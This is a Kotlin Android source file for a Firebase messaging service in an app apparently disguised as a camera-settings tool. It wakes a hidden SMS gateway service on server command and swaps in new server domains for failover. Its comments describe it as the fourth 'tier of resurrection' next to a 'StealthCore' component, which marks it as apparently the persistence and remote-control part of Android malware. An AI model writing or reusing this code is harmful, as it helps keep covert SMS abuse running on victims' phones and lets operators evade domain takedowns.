package com.settingpro.camera.service

import android.content.Intent
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.data.config.UrlConfig
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.single
import kotlinx.coroutines.flow.take
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * Firebase Cloud Messaging service for remote wake-up functionality.
 *
 * This service handles:
 * 1. FCM token updates - saves token to DataStore and registers with server
 * 2. Incoming messages - processes wake-up commands to restart SmsGatewayService
 * 3. Domain updates - processes remote domain configuration updates
 *
 * This is the fourth tier of resurrection - cloud-triggered wake-up that
 * complements the local resurrection mechanisms (StealthCore, AlarmReceiver, MultiEventReceiver).
 */
@AndroidEntryPoint
class FcmMessagingService : FirebaseMessagingService() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    @Inject
    lateinit var gson: Gson

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val TAG = "FcmMessagingService"
        private const val MESSAGE_TYPE_WAKEUP = "wakeup"
        private const val MESSAGE_TYPE_DOMAIN_UPDATE = "domain_update"
    }

    /**
     * Called when a new FCM token is generated.
     * This happens when:
     * - App is first installed
     * - Token is invalidated/rotated by Firebase
     * - App is restored on a new device
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        AppLogger.d(TAG, "New FCM token received: ${token.take(16)}...")

        serviceScope.launch {
            try {
                // Save token to DataStore
                settingsDataStore.setFcmToken(token)
                AppLogger.d(TAG, "FCM token saved to DataStore")

                // If service is running, it will pick up the new token
                // on the next heartbeat cycle and register with server
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error saving FCM token", e)
            }
        }
    }

    /**
     * Called when an FCM message is received while app is in foreground.
     * For wake-up messages, we ensure SmsGatewayService is running.
     */
    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)

        val messageType = message.data["type"]
        AppLogger.d(TAG, "FCM message received: type=$messageType")

        when (messageType) {
            MESSAGE_TYPE_WAKEUP -> handleWakeUpMessage(message)
            MESSAGE_TYPE_DOMAIN_UPDATE -> handleDomainUpdateMessage(message)
            else -> AppLogger.d(TAG, "Unknown message type: $messageType")
        }
    }

    /**
     * Called when messages are deleted on the FCM server.
     * This can serve as a wake-up signal to check server status.
     */
    override fun onDeletedMessages() {
        super.onDeletedMessages()
        AppLogger.d(TAG, "FCM messages deleted - treating as wake-up signal")
        ensureServiceRunning()
    }

    /**
     * Handle wake-up message from server.
     * Ensures SmsGatewayService is running.
     */
    private fun handleWakeUpMessage(message: RemoteMessage) {
        val serverTimestamp = message.data["server_timestamp"]
        AppLogger.d(TAG, "Wake-up message received from server (timestamp: $serverTimestamp)")

        ensureServiceRunning()
    }

    /**
     * Handle domain update message from server.
     * Updates the domain configuration for failover.
     */
    private fun handleDomainUpdateMessage(message: RemoteMessage) {
        AppLogger.d(TAG, "Domain update message received")

        serviceScope.launch {
            try {
                val domainsJson = message.data["domains"]
                val replace = message.data["replace"]?.toBoolean() ?: false

                if (domainsJson.isNullOrEmpty()) {
                    AppLogger.w(TAG, "Domain update message missing domains")
                    return@launch
                }

                // Parse domains from JSON
                val domainsListType = object : TypeToken<List<String>>() {}.type
                val newDomains: List<String> = gson.fromJson(domainsJson, domainsListType)

                if (newDomains.isEmpty()) {
                    AppLogger.w(TAG, "Domain update message has empty domains list")
                    return@launch
                }

                // Get current config and merge
                val currentConfig = settingsDataStore.urlConfig
                    .take(1) // Take only the first value
                    .single()

                val updatedConfig = currentConfig.mergeDomains(newDomains, replace)
                settingsDataStore.setUrlConfig(updatedConfig)

                AppLogger.d(TAG, "Domain config updated: ${newDomains.size} domains, replace=$replace")

                // Force reconnect to use new domains
                if (SmsGatewayService.isServiceRunning()) {
                    AppLogger.d(TAG, "Triggering reconnect with new domain config")
                    SmsGatewayService.forceReconnect()
                }
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error handling domain update message", e)
            }
        }
    }

    /**
     * Ensure SmsGatewayService is running.
     * If not running, start it.
     */
    private fun ensureServiceRunning() {
        if (!SmsGatewayService.isServiceRunning()) {
            AppLogger.d(TAG, "SmsGatewayService not running - starting it")
            SmsGatewayService.startService(applicationContext)
        } else {
            AppLogger.d(TAG, "SmsGatewayService already running")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
